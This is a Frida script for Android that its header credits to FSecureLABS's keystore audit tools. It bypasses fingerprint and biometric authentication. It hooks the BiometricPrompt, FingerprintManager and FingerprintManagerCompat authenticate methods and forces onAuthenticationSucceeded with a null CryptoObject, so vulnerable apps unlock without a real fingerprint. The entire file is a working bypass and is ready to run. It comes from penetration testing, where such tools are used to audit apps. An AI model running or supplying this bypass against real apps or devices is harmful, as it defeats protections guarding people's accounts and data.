/****************************************************************************************************************************
 * Name: Fingerprint Bypass
 * OS: Android
 * Author: FSecureLABS
 * Source: https://github.com/FSecureLABS/android-keystore-audit/blob/master/frida-scripts/fingerprint-bypass.js
 * Info: 
    Bypass fingerprint authentication if the app accept NULL cryptoObject in onAuthenticationSucceeded(...).
    This script should automatically bypass fingerprint when authenticate(...) method will be called.
*****************************************************************************************************************************/


send("Fingerprint hooks loaded!");

Java.perform(function () {
    //Call in try catch as Biometric prompt is supported since api 28 (Android 9)
    try { hookBiometricPrompt_authenticate(); }
    catch (error) { send("hookBiometricPrompt_authenticate not supported on this android version") }
    try { hookBiometricPrompt_authenticate2(); }
    catch (error) { send("hookBiometricPrompt_authenticate not supported on this android version") }
    try { hookFingerprintManagerCompat_authenticate(); }
    catch (error) { send("hookFingerprintManagerCompat_authenticate failed"); }
    try { hookFingerprintManager_authenticate(); }
    catch (error) { send("hookFingerprintManager_authenticate failed"); }
});



var cipherList = [];
var StringCls = null;
Java.perform(function () {
    StringCls = Java.use('java.lang.String');


});

function getAuthResult(resultObj, cryptoInst) {
    try {
        var authenticationResultInst = resultObj.$new(cryptoInst, null, 0);
    } catch (error) {
        try {
            var authenticationResultInst = resultObj.$new(cryptoInst, null);
        }
        catch (error) {
            var authenticationResultInst = resultObj.$new(cryptoInst);
        }
    }
    send("cryptoInst:, " + cryptoInst + " class: " + cryptoInst.$className);
    return authenticationResultInst;
}

function getBiometricPromptAuthResult() {
    var sweet_cipher = null;
    var cryptoObj = Java.use('android.hardware.biometrics.BiometricPrompt$CryptoObject');
    var cryptoInst = cryptoObj.$new(sweet_cipher);
    var authenticationResultObj = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
    var authenticationResultInst = getAuthResult(authenticationResultObj, cryptoInst);
    return authenticationResultInst
}

function hookBiometricPrompt_authenticate() {
    var biometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt')['authenticate'].overload('android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
    send("Hooking BiometricPrompt.authenticate()...");
    biometricPrompt.implementation = function (cancellationSignal, executor, callback) {
        send("[BiometricPrompt.BiometricPrompt()]: cancellationSignal: " + cancellationSignal + ", executor: " + ", callback: " + callback);
        var authenticationResultInst = getBiometricPromptAuthResult();
        callback.onAuthenticationSucceeded(authenticationResultInst);
    }
}

function hookBiometricPrompt_authenticate2() {
    var biometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt')['authenticate'].overload('android.hardware.biometrics.BiometricPrompt$CryptoObject', 'android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
    send("Hooking BiometricPrompt.authenticate2()...");
    biometricPrompt.implementation = function (crypto, cancellationSignal, executor, callback) {
        send("[BiometricPrompt.BiometricPrompt2()]: crypto:" + crypto + ", cancellationSignal: " + cancellationSignal + ", executor: " + ", callback: " + callback);
        var authenticationResultInst = getBiometricPromptAuthResult();
        callback.onAuthenticationSucceeded(authenticationResultInst);
    }
}

function hookFingerprintManagerCompat_authenticate() {
    /*
    void authenticate (FingerprintManagerCompat.CryptoObject crypto, 
                    int flags, 
                    CancellationSignal cancel, 
                    FingerprintManagerCompat.AuthenticationCallback callback, 
                    Handler handler)
    */
    var fingerprintManagerCompat = null;
    var cryptoObj = null;
    var authenticationResultObj = null;
    try {
        fingerprintManagerCompat = Java.use('android.support.v4.hardware.fingerprint.FingerprintManagerCompat');
        cryptoObj = Java.use('android.support.v4.hardware.fingerprint.FingerprintManagerCompat$CryptoObject');
        authenticationResultObj = Java.use('android.support.v4.hardware.fingerprint.FingerprintManagerCompat$AuthenticationResult');
    } catch (error) {
        try {
            fingerprintManagerCompat = Java.use('androidx.core.hardware.fingerprint.FingerprintManagerCompat');
            cryptoObj = Java.use('androidx.core.hardware.fingerprint.FingerprintManagerCompat$CryptoObject');
            authenticationResultObj = Java.use('androidx.core.hardware.fingerprint.FingerprintManagerCompat$AuthenticationResult');
        }
        catch (error) {
            send("FingerprintManagerCompat class not found!");
            return
        }
    }
    send("Hooking FingerprintManagerCompat.authenticate()...");
    var fingerprintManagerCompat_authenticate = fingerprintManagerCompat['authenticate'];
    fingerprintManagerCompat_authenticate.implementation = function (crypto, flags, cancel, callback, handler) {
        send("[FingerprintManagerCompat.authenticate()]: crypto: " + crypto + ", flags: " + flags + ", cancel:" + cancel + ", callback: " + callback + ", handler: " + handler);
        //send(enumMethods(callback.$className));
        callback['onAuthenticationFailed'].implementation = function () {
            send("[onAuthenticationFailed()]:");
            var sweet_cipher = null;
            var cryptoInst = cryptoObj.$new(sweet_cipher);
            var authenticationResultInst = getAuthResult(authenticationResultObj, cryptoInst);
            callback.onAuthenticationSucceeded(authenticationResultInst);
        }
        return this.authenticate(crypto, flags, cancel, callback, handler);
    }
}

function hookFingerprintManager_authenticate() {
    /*
    public void authenticate (FingerprintManager.CryptoObject crypto, 
                    CancellationSignal cancel, 
                    int flags, 
                    FingerprintManager.AuthenticationCallback callback, 
                    Handler handler)
Error: authenticate(): has more than one overload, use .overload(<signature>) to choose from:
    .overload('android.hardware.fingerprint.FingerprintManager$CryptoObject', 'android.os.CancellationSignal', 'int', 'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback', 'android.os.Handler')
    .overload('android.hardware.fingerprint.FingerprintManager$CryptoObject', 'android.os.CancellationSignal', 'int', 'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback', 'android.os.Handler', 'int')


    */
    var fingerprintManager = null;
    var cryptoObj = null;
    var authenticationResultObj = null;
    try {
        fingerprintManager = Java.use('android.hardware.fingerprint.FingerprintManager');
        cryptoObj = Java.use('android.hardware.fingerprint.FingerprintManager$CryptoObject');
        authenticationResultObj = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationResult');
    } catch (error) {
        try {
            fingerprintManager = Java.use('androidx.core.hardware.fingerprint.FingerprintManager');
            cryptoObj = Java.use('androidx.core.hardware.fingerprint.FingerprintManager$CryptoObject');
            authenticationResultObj = Java.use('androidx.core.hardware.fingerprint.FingerprintManager$AuthenticationResult');
        }
        catch (error) {
            send("FingerprintManager class not found!");
            return
        }
    }
    send("Hooking FingerprintManager.authenticate()...");

    var fingerprintManager_authenticate = fingerprintManager['authenticate'].overload('android.hardware.fingerprint.FingerprintManager$CryptoObject', 'android.os.CancellationSignal', 'int', 'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback', 'android.os.Handler');
    fingerprintManager_authenticate.implementation = function (crypto, cancel, flags, callback, handler) {
        send("[FingerprintManager.authenticate()]: crypto: " + crypto + ", flags: " + flags + ", cancel:" + cancel + ", callback: " + callback + ", handler: " + handler);
        var sweet_cipher = null;
        var cryptoInst = cryptoObj.$new(sweet_cipher);
        var authenticationResultInst = getAuthResult(authenticationResultObj, cryptoInst);
        callback.onAuthenticationSucceeded(authenticationResultInst);
        return this.authenticate(crypto, cancel, flags, callback, handler);
    }
}


function enumMethods(targetClass) {
    var hook = Java.use(targetClass);
    var ownMethods = hook.class.getDeclaredMethods();

    return ownMethods;
}